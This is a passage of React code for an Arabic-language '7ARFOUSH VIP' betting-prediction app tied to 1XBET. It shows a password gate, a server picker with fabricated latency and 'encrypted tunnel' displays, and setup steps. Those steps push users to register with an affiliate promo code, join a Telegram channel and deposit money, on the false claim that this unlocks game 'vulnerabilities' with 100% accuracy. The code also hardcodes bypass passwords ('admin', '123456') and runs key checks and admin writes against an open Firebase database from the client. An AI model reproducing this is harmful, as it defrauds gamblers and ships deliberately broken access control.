                  <span className="text-[9px] font-mono text-red-500 font-extrabold uppercase">DECRYPTION SECRET</span>
                </div>

                <div className="relative group">
                  <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-4.5 h-4.5 text-white/30 group-focus-within:text-red-400 transition-colors" />
                  <input 
                    type={showLoginPassword ? "text" : "password"} 
                    placeholder="أدخل كلمة السر هنا..."
                    value={loginPassword}
                    onChange={(e) => {
                      setLoginPassword(e.target.value);
                      setLoginError('');
                    }}
                    onKeyDown={(e) => {
                      if (e.key === 'Enter') {
                        handlePasswordLogin();
                      }
                    }}
                    className="w-full bg-red-950/10 border border-red-500/20 focus:border-red-400 rounded-xl py-3.5 pl-11 pr-11 text-white placeholder:text-white/20 focus:outline-none transition-all font-mono text-center text-sm font-bold tracking-wider focus:ring-1 focus:ring-red-500/20 shadow-inner"
                    id="login-password-input"
                  />
                  <button
                    type="button"
                    onClick={() => setShowLoginPassword(!showLoginPassword)}
                    className="absolute right-4 top-1/2 -translate-y-1/2 text-white/30 hover:text-red-400 transition-colors"
                  >
                    {showLoginPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>

                <div className="text-center">
                  <button
                    type="button"
                    onClick={() => setCurrentScreen('CONDITION')}
                    className="text-xs text-red-400 hover:text-red-300 font-black tracking-wide transition-colors cursor-pointer hover:underline font-sans"
                    id="goto-conditions-btn"
                  >
                    هل تريد كلمه مرور ؟
                  </button>
                </div>

                {loginError && (
                  <motion.p 
                    initial={{ opacity: 0, y: -5 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="text-red-400 text-[10px] font-bold text-center mt-1"
                  >
                    {loginError}
                  </motion.p>
                )}


              </div>

              {/* Action submit button */}
              <motion.button 
                whileHover={!isLoggingIn ? { scale: 1.015, boxShadow: "0 8px 25px rgba(239,68,68,0.25)" } : {}}
                whileTap={!isLoggingIn ? { scale: 0.985 } : {}}
                onClick={handlePasswordLogin}
                disabled={isLoggingIn}
                className={cn(
                  "w-full py-3.5 rounded-xl font-black text-xs tracking-wider transition-all cursor-pointer relative overflow-hidden flex items-center justify-center gap-2",
                  isLoggingIn 
                    ? "bg-red-950/40 text-red-500/50 border border-red-500/20 cursor-not-allowed" 
                    : "bg-gradient-to-r from-red-650 to-red-500 text-white hover:from-red-500 hover:to-red-400"
                )}
                id="submit-password-login"
              >
                {isLoggingIn ? (
                  <>
                    <RefreshCcw className="w-4 h-4 animate-spin" />
                    <span>جاري التحقق من الصلاحية...</span>
                  </>
                ) : (
                  <span>فتح بوابة النظام المشفر</span>
                )}
              </motion.button>
            </div>
          </div>

          {/* Footer Branding Label */}
          <div className="mt-6 text-center pb-4 select-none relative z-10">
            <span className="text-[8px] font-mono text-red-500/40 uppercase tracking-[0.25em] font-black">
              DRAGON SECURE ACCESS GATEWAY
            </span>
          </div>
        </div>
      );
    }

    // IfLoggedIn, render the original server selection screen seamlessly!
    return (
      <div className="flex flex-col min-h-screen justify-between p-6 max-w-md mx-auto relative overflow-x-hidden bg-transparent select-none font-sans">
        
        {/* High-Tech Tactical Grid Background & Cyber Guideline Overlays */}
        <div className="absolute inset-0 border border-red-500/5 pointer-events-none z-0">
          <div className="absolute top-12 left-4 text-[7px] font-mono text-red-500/25 tracking-widest">SECURE_LNK_CONNECTED</div>
          <div className="absolute top-12 right-4 text-[7px] font-mono text-red-500/25 tracking-widest">LINK_RATE: 100%</div>
          <div className="absolute inset-x-0 top-1/3 border-t border-red-500/[0.02]" />
          <div className="absolute inset-x-0 bottom-1/4 border-b border-red-500/[0.02]" />
        </div>

        {/* Decorative red glow spotlights */}
        <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-80 h-80 bg-red-500/5 rounded-full blur-[100px] pointer-events-none z-0" />
        <div className="absolute bottom-1/3 left-10 w-64 h-64 bg-red-600/5 rounded-full blur-[90px] pointer-events-none z-0" />

        {/* Futuristic Red HUD Capsule Header */}
        <div className="flex justify-between items-center relative z-10 bg-black/60 border border-red-500/25 rounded-[22px] px-4.5 py-3.5 shadow-[0_4px_25px_rgba(239,68,68,0.06)] backdrop-blur-xl group">
          <div className="absolute top-0 inset-x-0 h-[1.5px] bg-gradient-to-r from-transparent via-red-400 to-transparent opacity-80" />
          
          <div className="flex items-center gap-2">
            <div className="w-2 h-2 rounded-full bg-red-500 animate-ping shrink-0" />
            <div className="flex flex-col">
              <span className="text-[7.5px] font-black text-red-400/50 tracking-widest font-mono leading-none">VIP GATEWAY</span>
              <span className="text-[10px] font-mono font-black text-red-400 tracking-wider mt-0.5 uppercase">
                {onlineUsers.toLocaleString()} ONLINE
              </span>
            </div>
          </div>
          
          <div className="flex items-center gap-2 text-right">
            <div className="flex flex-col items-end">
              <span className="text-[7.5px] font-black text-red-400/50 tracking-widest font-mono font-bold leading-none">STATUS NODE</span>
              <span className="text-[10px] font-mono font-black text-red-400 tracking-wider mt-0.5 uppercase">PORTAL ACTIVE</span>
            </div>
            <div className="w-6 h-6 rounded-lg bg-red-500/10 border border-red-500/30 flex items-center justify-center shrink-0">
              <Crown className="w-3.5 h-3.5 text-red-400 animate-pulse" />
            </div>
          </div>
        </div>

        {/* Premium Cyber Decryption Info Bar */}
        <div className="bg-gradient-to-r from-red-950/10 via-red-950/30 to-red-950/10 border-y border-red-500/10 py-2.5 px-4 flex items-center justify-between text-[8px] font-mono tracking-widest text-red-300 relative z-10">
          <div className="flex items-center gap-1.5">
            <span className="inline-block w-1.5 h-1.5 bg-red-400 rounded-full animate-ping" />
            <span>CYBER_TUNNEL: ENCRYPTED</span>
          </div>
          <span className="text-white/35 font-bold">V4.8 GOLD VIP</span>
        </div>

        {/* Hero Core Segment / Server Cards Choice */}
        <div className="flex-grow flex flex-col justify-center items-center relative z-10 w-full my-auto py-6 space-y-6">
          
          {/* Animated Cyber Orbital Logo Ring */}
          <div className="flex flex-col items-center text-center space-y-4 w-full">
            <div className="relative">
              <div className="absolute -inset-4 rounded-full border border-red-500/10 animate-ping opacity-25" />
              <div className="absolute inset-0 border border-red-500/10 rounded-full scale-[1.3] -z-10 animate-spin-slow pointer-events-none" />
              <div className="absolute inset-0 border border-red-500/5 rounded-full scale-[1.65] -z-10 animate-reverse-spin-slow pointer-events-none" />
              <div className="p-4 bg-red-500/5 border border-red-500/20 rounded-full">
                <ElegantLogo size="md" className="drop-shadow-[0_15px_35px_rgba(239,68,68,0.25)] scale-95" />
              </div>
            </div>
            
            <div className="space-y-1 mt-2">
              <h2 className="text-xl font-light text-white tracking-wide">
                اختر <span className="text-red-400 font-black">خادم الاتصال</span> المشفر
              </h2>
              <div className="h-[2px] w-12 bg-gradient-to-r from-transparent via-red-500/50 to-transparent mx-auto mt-2" />
              <p className="text-white/40 text-[10.5px] font-semibold tracking-wide max-w-xs mx-auto mt-1 leading-relaxed">
                الرجاء تحديد خادم البوابة الآمن بحد أقصى للحماية وبدء استرداد وفحص الإشارات
              </p>
            </div>
          </div>

          {/* Server Selection stacked vertically with glowing borders */}
          <div className="flex flex-col gap-4 w-full max-w-sm mx-auto">
            {/* Card 1: Egypt Server (EGYPT GATEWAY) */}
            <motion.button
              whileHover={{ scale: 1.025, y: -2 }}
              whileTap={{ scale: 0.98 }}
              onClick={() => handleServerSelect('SERVER_EG')}
              className="p-4 bg-black/65 border border-red-500/20 hover:border-red-500/50 rounded-[24px] shadow-[0_15px_35px_rgba(0,0,0,0.6)] backdrop-blur-md flex items-center justify-between gap-4 transition-all cursor-pointer relative overflow-hidden group select-none text-right w-full"
            >
              {/* Ambient top scanline */}
              <div className="absolute top-0 inset-x-0 h-[1.5px] bg-gradient-to-r from-transparent via-red-400/80 to-transparent opacity-80" />
              <div className="absolute -inset-10 bg-red-500/5 rounded-full blur-2xl opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none" />
              
              <div className="flex items-center gap-3 w-[63%]">
                <div className="relative shrink-0">
                  <div className="absolute -inset-2 bg-red-500/10 rounded-full blur-md group-hover:bg-red-500/25 transition-colors" />
                  <div className="w-12 h-12 rounded-2xl bg-red-500/5 border border-red-500/20 flex items-center justify-center text-3xl group-hover:scale-110 transition-transform duration-300 shadow-[inset_0_2px_8px_rgba(0,0,0,0.8)]">
                    🇪🇬
                  </div>
                </div>
                <div className="text-right">
                  <span className="text-[8.5px] font-mono tracking-widest text-red-500 font-black block">EGYPT GATEWAY</span>
                  <h4 className="text-sm font-black text-white group-hover:text-red-400 transition-colors mt-0.5 leading-none">سيرفر جمهورية مصر</h4>
                  <p className="text-[10px] text-white/45 mt-1 font-semibold">بوابة اتصال آمن وثابت</p>
                </div>
              </div>

              <div className="flex flex-col items-end gap-1.5 w-[33%] border-r border-red-500/15 pr-3.5 shrink-0">
                <div className="flex items-center gap-1 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/35 font-mono">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                  <span className="text-[8.5px] font-mono text-emerald-400 font-bold">24ms</span>
                </div>
                
                <div className="w-full text-right font-mono">
                  <div className="flex justify-between items-center text-[7.5px] text-white/40 mb-0.5 font-bold">
                    <span>LOAD</span>
                    <span className="font-bold text-red-400">38%</span>
                  </div>
                  <div className="w-full h-1.5 bg-white/5 rounded-full overflow-hidden p-[0.5px]">
                    <div className="w-[38%] h-full bg-red-500 rounded-full shadow-[0_0_8px_rgba(239,68,68,0.6)]" />
                  </div>
                </div>
              </div>
            </motion.button>

            {/* Card 2: Other Server (GLOBAL GATEWAY) */}
            <motion.button
              whileHover={{ scale: 1.025, y: -2 }}
              whileTap={{ scale: 0.98 }}
              onClick={() => handleServerSelect('SERVER_INT')}
              className="p-4 bg-black/65 border border-red-500/20 hover:border-red-500/50 rounded-[24px] shadow-[0_15px_35px_rgba(0,0,0,0.6)] backdrop-blur-md flex items-center justify-between gap-4 transition-all cursor-pointer relative overflow-hidden group select-none text-right w-full"
            >
              {/* Ambient top scanline */}
              <div className="absolute top-0 inset-x-0 h-[1.5px] bg-gradient-to-r from-transparent via-red-400/80 to-transparent opacity-80" />
              <div className="absolute -inset-10 bg-red-500/5 rounded-full blur-2xl opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none" />
              
              <div className="flex items-center gap-3 w-[63%]">
                <div className="relative shrink-0">
                  <div className="absolute -inset-2 bg-red-500/10 rounded-full blur-md group-hover:bg-red-500/25 transition-colors" />
                  <div className="w-12 h-12 rounded-2xl bg-red-500/5 border border-red-500/20 flex items-center justify-center text-3xl group-hover:scale-110 transition-transform duration-300 shadow-[inset_0_2px_8px_rgba(0,0,0,0.8)]">
                    🌐
                  </div>
                </div>
                <div className="text-right">
                  <span className="text-[8.5px] font-mono tracking-widest text-red-400 font-black block">GLOBAL SYSTEM</span>
                  <h4 className="text-sm font-black text-white group-hover:text-red-400 transition-colors mt-0.5 leading-none">سيرفر الدول العربية</h4>
                  <p className="text-[10px] text-white/45 mt-1 font-semibold">بوابة الدول العربية المشتركة</p>
                </div>
              </div>

              <div className="flex flex-col items-end gap-1.5 w-[33%] border-r border-red-500/15 pr-3.5 shrink-0">
                <div className="flex items-center gap-1 bg-red-500/10 px-2 py-0.5 rounded border border-red-500/35 font-mono">
                  <span className="w-1.5 h-1.5 rounded-full bg-red-400 animate-pulse" />
                  <span className="text-[8.5px] font-mono text-red-400 font-bold">48ms</span>
                </div>
                
                <div className="w-full text-right font-mono">
                  <div className="flex justify-between items-center text-[7.5px] text-white/40 mb-0.5 font-bold">
                    <span>LOAD</span>
                    <span className="font-bold text-red-400">45%</span>
                  </div>
                  <div className="w-full h-1.5 bg-white/5 rounded-full overflow-hidden p-[0.5px]">
                    <div className="w-[45%] h-full bg-red-500 rounded-full shadow-[0_0_8px_rgba(239,68,68,0.6)]" />
                  </div>
                </div>
              </div>
            </motion.button>
          </div>

        </div>

        {/* Footer Branding Label */}
        <div className="mt-2 text-center pb-4 select-none relative z-10">
          <span className="text-[8px] font-mono text-red-500/40 uppercase tracking-[0.25em] font-black">
            DRAGON ACTIVE ENCRYPTION ENDPOINTS
          </span>
        </div>

        {/* Connection Floating Dialog Box Overlay */}
        <AnimatePresence>
          {isConnectingServer && (
            <div className="fixed inset-0 z-50 flex items-center justify-center p-6 bg-black/90 backdrop-blur-md">
              <motion.div
                initial={{ scale: 0.93, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                exit={{ scale: 0.93, opacity: 0 }}
                className="w-full max-w-xs bg-gradient-to-b from-[#140204]/95 to-black/98 p-8 rounded-[36px] text-center border border-red-500/30 shadow-[0_0_50px_rgba(239,68,68,0.25)] space-y-6 relative overflow-hidden"
              >
                {/* Corner bracket decorators inside card */}
                <div className="absolute top-4 left-4 w-3.5 h-3.5 border-t border-l border-red-500/30" />
                <div className="absolute top-4 right-4 w-3.5 h-3.5 border-t border-r border-red-500/30" />
                <div className="absolute bottom-4 left-4 w-3.5 h-3.5 border-b border-l border-red-500/30" />
                <div className="absolute bottom-4 right-4 w-3.5 h-3.5 border-b border-r border-red-500/30" />
                <div className="absolute top-0 inset-x-0 h-[1.5px] bg-gradient-to-r from-transparent via-red-400 to-transparent" />
                
                {connectionStatus === 'CONNECTING' ? (
                  <>
                    <div className="relative w-16 h-16 mx-auto flex items-center justify-center font-sans">
                      <motion.div
                        animate={{ rotate: 360 }}
                        transition={{ duration: 1.5, repeat: Infinity, ease: "linear" }}
                        className="absolute inset-0 rounded-full border border-t-red-500 border-r-transparent border-b-transparent border-l-transparent"
                      />
                      <div className="w-12 h-12 rounded-full bg-red-500/5 border border-red-500/20 flex items-center justify-center text-red-400">
                        <ExternalLink className="w-5.5 h-5.5 text-red-400 animate-pulse" />
                      </div>
                    </div>
                    <div className="space-y-1">
                      <h3 className="text-lg font-black text-white font-sans">جار الاتصال بالسيرفر...</h3>
                      <p className="text-[9px] font-mono text-red-400/40 uppercase tracking-widest font-bold">CONNECTING TO GATE PROTOCOL</p>
                    </div>
                  </>
                ) : (
                  <>
                    <div className="w-16 h-16 bg-emerald-500/10 rounded-full border border-emerald-500/35 flex items-center justify-center mx-auto relative font-sans">
                      <Check className="w-8 h-8 text-emerald-400" strokeWidth={3.5} />
                      <div className="absolute inset-x-0 bottom-0 h-0.5 rounded-full bg-emerald-400 blur-xs animate-ping" />
                    </div>
                    <div className="space-y-1">
                      <h3 className="text-lg font-black text-emerald-400 font-sans">تم الاتصال بالسيرفر بنجاح</h3>
                      <p className="text-[9px] font-mono text-emerald-500/50 uppercase tracking-widest font-black">ROUTE STABILIZED</p>
                    </div>
                  </>
                )}
              </motion.div>
            </div>
          )}
        </AnimatePresence>
      </div>
    );
  };

  const handlePasswordLogin = async () => {
    if (!loginPassword.trim()) {
      setLoginError('يرجى إدخال كلمة المرور لتفعيل الخادم.');
      return;
    }

    setIsLoggingIn(true);
    setLoginError('');

    // Static master bypass passwords
    if (loginPassword === '7ar2026' || loginPassword === '123456' || loginPassword === 'admin') {
      setIsLoggedIn(true);
      setCurrentScreen('PREDICTION');
      setIsLoggingIn(false);
      return;
    }

    try {
      // Fetch activation keys from user's custom RTDB path
      const response = await fetch('https://teslax-66c1a-default-rtdb.firebaseio.com/codes.json');
      if (response.ok) {
        const data = await response.json();
        if (data) {
          // Check if there is any key matching the password
          const matchedKey = Object.keys(data).find(key => {
            const item = data[key];
            if (item && String(item.code).trim() === loginPassword.trim()) {
              if (item.active === false) return false;
              
              // If duration is lifetime (e.g. 5256000), it won't expire
              if (item.duration && item.duration >= 5000000) return true;

              const durationMs = (item.duration || 0) * 60 * 1000;
              const elapsed = Date.now() - (item.createdAt || 0);
              if (elapsed >= durationMs) return false;

              return true;
            }
            return false;
          });

          if (matchedKey) {
            setIsLoggedIn(true);
            setCurrentScreen('PREDICTION');
            setIsLoggingIn(false);
            return;
          }
        }
      }
    } catch (e) {
      console.error("Error connecting to database to check password:", e);
    }

    setLoginError('كلمة المرور غير صحيحة أو انتهت صلاحيتها! يرجى التواصل مع الدعم @Nour_1XBET');
    setIsLoggingIn(false);
  };

  // ==================== ADMIN CORE PROTOCOLS (FIREBASE CODES MANAGEMENT) ====================
  const fetchAdminCodes = useCallback(async () => {
    setIsLoadingAdminCodes(true);
    try {
      const response = await fetch('https://teslax-66c1a-default-rtdb.firebaseio.com/codes.json');
      if (response.ok) {
        const data = await response.json();
        if (data) {
          const list = Object.keys(data).map(key => ({
            key,
            code: data[key].code || key,
            duration: data[key].duration || 0,
            createdAt: data[key].createdAt || 0,
            active: data[key].active !== false
          }));
          list.sort((a, b) => b.createdAt - a.createdAt);
          setDbCodes(list);
        } else {
          setDbCodes([]);
        }
      } else {
        setDbCodes([]);
      }
    } catch (e) {
      console.error("Error fetching admin codes:", e);
    } finally {
      setIsLoadingAdminCodes(false);
    }
  }, []);

  const createAdminCode = async () => {
    if (!adminCodeText.trim()) {
      triggerToast("يرجى إدخال نص الكود أولاً", "warning");
      return;
    }
    setIsSavingAdminCode(true);
    const codeKey = adminCodeText.trim();
    const newCode = {
      code: codeKey,
      duration: adminDuration,
      createdAt: Date.now(),
      active: true
    };
    try {
      const response = await fetch(`https://teslax-66c1a-default-rtdb.firebaseio.com/codes/${codeKey}.json`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(newCode)
      });
      if (response.ok) {
        triggerToast("تم إنشاء وتفعيل كود المرور بنجاح!", "success");
        setAdminCodeText('');
        fetchAdminCodes();
      } else {
        triggerToast("فشل حفظ الكود في السيرفر", "error");
      }
    } catch (e) {
      console.error("Error creating code:", e);
      triggerToast("خطأ بالاتصال بالسيرفر", "error");
    } finally {
      setIsSavingAdminCode(false);
    }
  };

  const deleteAdminCode = async (key: string) => {
    try {
      const response = await fetch(`https://teslax-66c1a-default-rtdb.firebaseio.com/codes/${key}.json`, {
        method: 'DELETE'
      });
      if (response.ok) {
        triggerToast("تم حذف الكود بنجاح", "success");
        fetchAdminCodes();
      } else {
        triggerToast("فشل حذف الكود من السيرفر", "error");
      }
    } catch (e) {
      console.error("Error deleting code:", e);
      triggerToast("خطأ أثناء الحذف", "error");
    }
  };

  const toggleAdminCodeActive = async (key: string, currentActive: boolean) => {
    try {
      const response = await fetch(`https://teslax-66c1a-default-rtdb.firebaseio.com/codes/${key}.json`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ active: !currentActive })
      });
      if (response.ok) {
        triggerToast(currentActive ? "تم إيقاف الكود مؤقتاً" : "تم إعادة تفعيل الكود", "info");
        fetchAdminCodes();
      } else {
        triggerToast("فشل تعديل حالة الكود", "error");
      }
    } catch (e) {
      console.error("Error toggling code state:", e);
      triggerToast("خطأ أثناء تعديل الحالة", "error");
    }
  };

  const generateRandomAdminCode = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const segment = () => Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
    const randomCode = `DZ-${segment()}-${segment()}`;
    setAdminCodeText(randomCode);
    triggerToast("تم توليد كود عشوائي جديد", "info");
  };

  useEffect(() => {
    if (currentScreen === 'ADMIN') {
      fetchAdminCodes();
    }
  }, [currentScreen, fetchAdminCodes]);

  const renderCondition = () => (
    <div className="min-h-screen p-4 sm:p-6 pb-16 max-w-md mx-auto relative overflow-x-hidden bg-transparent font-sans select-none">
      
      {/* Red Ambient Glowing Grid & Underlays */}
      <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-80 h-80 bg-red-650/10 rounded-full blur-[100px] pointer-events-none z-0" />
      <div className="absolute bottom-1/5 left-1/3 w-72 h-72 bg-red-600/5 rounded-full blur-[90px] pointer-events-none z-0" />

      {/* Decorative Technical Overlay */}
      <div className="absolute inset-0 border border-red-500/5 pointer-events-none z-0">
        <div className="absolute top-8 left-4 text-[7px] font-mono text-red-500/25 tracking-wider uppercase">HARFOUSH_MATRIX_SECURE</div>
        <div className="absolute top-8 right-4 text-[7px] font-mono text-red-500/25 tracking-wider uppercase">LINK_STAGE_ACTIVE</div>
      </div>

      <div className="relative z-10 space-y-5">
        
        {/* Module Header Bar */}
        <div className="flex items-center justify-between py-4 border-b border-red-500/15 select-none">
          <div className="flex items-center gap-3">
            <div className="flex flex-col text-left">
              <h2 className="text-lg font-black text-white tracking-widest font-display leading-none flex items-center gap-1.5">
                7ARFOUSH <span className="text-red-500 font-extrabold uppercase">VIP</span>
              </h2>
              <span className="text-[9px] text-red-500/60 tracking-widest uppercase font-mono mt-1 font-bold">SETUP SYSTEM CONSOLE</span>
            </div>
          </div>
          
          <div className="flex items-center gap-1.5 bg-red-500/10 border border-red-500/20 px-3 py-1 rounded-full">
            <span className="w-1.5 h-1.5 bg-red-400 rounded-full animate-pulse shadow-[0_0_8px_rgba(239,68,68,0.8)]" />
            <span className="text-red-400 text-[8px] sm:text-[9px] font-mono font-bold uppercase tracking-wider">
              {selectedServerName || 'GATEWAY ACTIVE'}
            </span>
          </div>
        </div>

        {/* Dashboard Grid Container */}
        <div className="space-y-4">
          
          {/* STEP 1: BRADY BROKER SELECTION (1XBET / MELBET) */}
          <div className="bg-black/55 border border-red-500/20 rounded-[24px] p-4 space-y-3 shadow-xl relative overflow-hidden backdrop-blur-md">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-mono text-red-500 font-extrabold block">PROTOCOL 01</span>
              <div className="flex items-center gap-2">
                <img 
                  src="https://i.pinimg.com/736x/85/09/2e/85092e36302014dac2140125ca9e706f.jpg" 
                  alt="1XBET Logo" 
                  className="w-6 h-6 rounded-lg object-cover border border-red-500/35 shadow-[0_0_8px_rgba(239,68,68,0.25)]" 
                  referrerPolicy="no-referrer"
                />
                <h3 className="text-xs font-black uppercase text-white/90 font-sans tracking-wide">الخطوة الأولى: اختر شركة المراهنات</h3>
              </div>
            </div>
            
            <div className="bg-black/90 border border-red-500/15 rounded-xl p-1 flex gap-1 select-none relative">
              {(['1XBET'] as const).map(provider => (
                <button
                  key={provider}
                  type="button"
                  onClick={() => {
                    setMainPlatform(provider);
                    setSelectedPlatform(provider); // Set standard first
                  }}
                  className={cn(
                    "flex-1 py-2.5 px-4 rounded-lg text-xs font-black tracking-widest transition-all duration-300 cursor-pointer font-sans text-center relative overflow-hidden",
                    mainPlatform === provider
                      ? "bg-red-600 text-white shadow-[0_4px_12px_rgba(239,68,68,0.3)] font-black"
                      : "text-white/40 hover:text-white/70 hover:bg-white/[0.01]"
                  )}
                >
                  <span className="relative z-10 uppercase">{provider}</span>
                </button>
              ))}
            </div>
          </div>

          {/* STEP 2: ACCOUNT TIER SELECTION (REGULAR VS VIP) */}
          <div className="bg-black/55 border border-red-500/20 rounded-[24px] p-4 space-y-3.5 shadow-xl relative overflow-hidden backdrop-blur-md">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-mono text-red-500 font-extrabold block">PROTOCOL 02</span>
              <h3 className="text-xs font-black uppercase text-white/90 font-sans tracking-wide">الخطوة الثانية: حدد باقة تنشيط الحساب</h3>
            </div>

            <div className="grid grid-cols-2 gap-3">
              {[
                { 
                  id: mainPlatform, 
                  title: mainPlatform, 
                  desc: "البوابة العادية ومزامنة AI", 
                  isVip: false 
                },
                { 
                  id: `${mainPlatform} VIP`, 
                  title: `${mainPlatform} VIP`, 
                  desc: "فك فوري وثنائية التشفير", 
                  isVip: true 
                }
              ].map(item => {
                const isSelected = selectedPlatform === item.id;
                return (
                  <button 
                    key={item.id}
                    type="button"
                    onClick={() => setSelectedPlatform(item.id)}
                    className={cn(
                      "p-3.5 rounded-xl flex flex-col items-center justify-center gap-2 border transition-all relative overflow-hidden text-center cursor-pointer min-h-[110px] group",
                      isSelected 
                        ? "border-red-500/80 bg-red-500/10 shadow-[0_6px_20px_rgba(239,68,68,0.15)] scale-[1.01]" 
                        : "border-white/5 bg-white/[0.01] hover:border-red-500/10"
                    )}
                  >
                    <div className={cn(
                      "w-9 h-9 rounded-full border flex items-center justify-center text-xl transition-all",
                      isSelected 
                        ? "bg-red-500/15 border-red-500/30 text-red-400" 
                        : "bg-white/[0.02] border-white/5 text-white/30"
                    )}>
                      {item.isVip ? <Crown className="w-4.5 h-4.5 text-red-500 fill-red-500/10 animate-pulse" /> : <ShieldCheck className="w-4.5 h-4.5 text-red-400" />}
                    </div>

                    <div className="space-y-0.5">
                      <span className={cn(
                        "font-black tracking-wider text-[11px] font-display uppercase block",
                        isSelected ? "text-white" : "text-white/45"
                      )}>
                        {item.title}
                      </span>
                      <span className="text-[8.5px] text-white/30 tracking-wide block leading-tight font-medium">
                        {item.desc}
                      </span>
                    </div>

                    {isSelected && (
                      <div className="absolute right-2 top-2 w-4 h-4 rounded-full flex items-center justify-center text-white border bg-red-500 border-white/30">
                        <Check className="w-2.5 h-2.5 stroke-[4]" />
                      </div>
                    )}
                  </button>
                );
              })}
            </div>
          </div>

          {/* STEP 3: INTERACTIVE ACTION PROTOCOLS (TELEGRAM & PROMO TASKS) */}
          <div className="grid grid-cols-1 gap-3">
            
            {/* Telegram Link Subpanel */}
            <div className="bg-black/55 border border-red-500/20 rounded-[24px] p-4 space-y-2.5 shadow-xl backdrop-blur-md">
              <div className="flex items-center justify-between">
                <span className="text-[9px] font-mono text-red-500 font-extrabold px-1 rounded uppercase">PROTOCOL 03</span>
                <h3 className="text-xs font-black uppercase text-white/90 font-sans tracking-wide">الخطوة الثالثة: تفعيل البث الخاص بنا</h3>
              </div>

              <a 
                href="https://t.me/+hcku36BtQbg2ZDlk" 
                target="_blank" 
                rel="noopener noreferrer"
                className="p-3 bg-red-500/[0.02] hover:bg-red-400/[0.08] border border-red-500/15 hover:border-red-400/40 rounded-xl flex items-center justify-between group transition-all duration-300 cursor-pointer text-right"
                id="telegram-channel-join"
              >
                <div className="flex items-center gap-2.5">
                  <div className="p-2 bg-red-500/10 border border-red-500/20 rounded-lg group-hover:scale-105 transition-transform shrink-0">
                    <Send className="w-4.5 h-4.5 text-red-400" />
                  </div>
                  <div className="flex flex-col text-left">
                    <span className="text-[11px] font-black text-white font-display uppercase">القناة الرسمية والتدقيق</span>
                    <span className="text-[9px] text-red-500/60 font-mono tracking-wider">7ARFOUSH TELEGRAM</span>
                  </div>
                </div>
                <div className="text-[9px] font-bold text-white bg-red-600 hover:bg-red-500 px-3.5 py-2 rounded-lg transition-all font-mono uppercase tracking-widest shadow-md">
                  انضم للتليجرام
                </div>
              </a>
            </div>

            {/* Promo Code Copy Card */}
            <div className="bg-black/55 border border-red-500/20 rounded-[24px] p-4 space-y-2.5 shadow-xl backdrop-blur-md">
              <div className="flex items-center justify-between">
                <span className="text-[9px] font-mono text-red-500 font-extrabold px-1 rounded uppercase">PROTOCOL 04</span>
                <h3 className="text-xs font-black uppercase text-white/90 font-sans tracking-wide">الخطوة الرابعة: التسجيل بكود فك النمط</h3>
              </div>

              <p className="text-white/50 text-[10px] leading-relaxed text-right font-medium">
                افتح حساباً جديداً كلياً مستخدماً بروموكود التنشيط الإجباري التالي:
              </p>

              <div className="relative p-3.5 bg-red-950/10 border border-dashed border-red-500/30 rounded-xl flex items-center justify-between overflow-hidden shadow-inner group">
                <div className="flex items-center gap-3">
                  <span className="relative flex h-2.5 w-2.5">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75 animate-bounce"></span>
                    <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
                  </span>
                  <span className="font-mono text-xl font-black text-white tracking-[0.25em] drop-shadow-[0_0_10px_rgba(239,68,68,0.55)]">
                    DZ7Bet
                  </span>
                </div>
                
                <button 
                  type="button"
                  onClick={handleCopyCode} 
                  className="flex items-center gap-1.5 px-3.5 py-2 bg-red-500/10 hover:bg-red-500 hover:text-white active:scale-95 transition-all text-red-400 font-mono border border-red-500/20 rounded-lg cursor-pointer"
                  id="copy-promo-button"
                >
                  <Copy className="w-3.5 h-3.5" />
                  <span className="text-[9px] font-black uppercase tracking-wider">نسخ</span>
                </button>
                
                <AnimatePresence>
                  {showCopyToast && (
                    <motion.div 
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      exit={{ opacity: 0 }}
                      className="absolute inset-0 bg-gradient-to-r from-red-600 to-red-500 text-white font-black tracking-widest text-xs font-sans flex items-center justify-center placeholder-shown:select-none"
                    >
                      تم نسخ البروموكود بنجاح!
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            </div>

          </div>

          {/* DYNAMIC FUNDING RULES PROTOCOL */}
          <div className="bg-black/55 border border-red-500/20 rounded-[24px] p-4 shadow-xl backdrop-blur-md relative overflow-hidden">
            <div className="absolute right-0 top-0 w-12 h-12 bg-red-500/5 rounded-full blur-xl pointer-events-none" />
            <div className="flex items-center justify-between mb-2">
              <span className="text-[9px] font-mono text-red-500 font-extrabold uppercase">DEPOSIT THRESHOLD</span>
              <h3 className="text-xs font-black text-white/50 font-sans tracking-wide">الحد الأدنى لشحن وتفعيل الحساب</h3>
            </div>

            <div className="p-3 bg-red-650/5 border border-red-500/15 rounded-xl">
              {(selectedPlatform?.includes('VIP')) ? (
                <div className="space-y-1">
                  <h4 className="text-red-400 font-black text-[12px] font-sans text-right flex items-center gap-1.5 justify-end">
                    <Crown className="w-4 h-4 text-red-400 fill-red-400/10" />
                    اشحن الحساب بمبلغ 300 جنيه (أو 5$) أو أكثر
                  </h4>
                  <p className="text-white/45 text-[10px] text-right font-sans leading-relaxed">
                    لتأكيد ترقية الآيدي الفائقة وتنشيط باقة VIP الذهبية وفك تشفير كامل ثغرات اللعبة بدقة 100%.
                  </p>
                </div>
              ) : (
                <div className="space-y-1">
                  <h4 className="text-white font-black text-[12px] font-sans text-right flex items-center gap-1.5 justify-end">
                    اشحن الحساب بمبلغ 300 جنيه (أو 5$) أو أكثر
                  </h4>
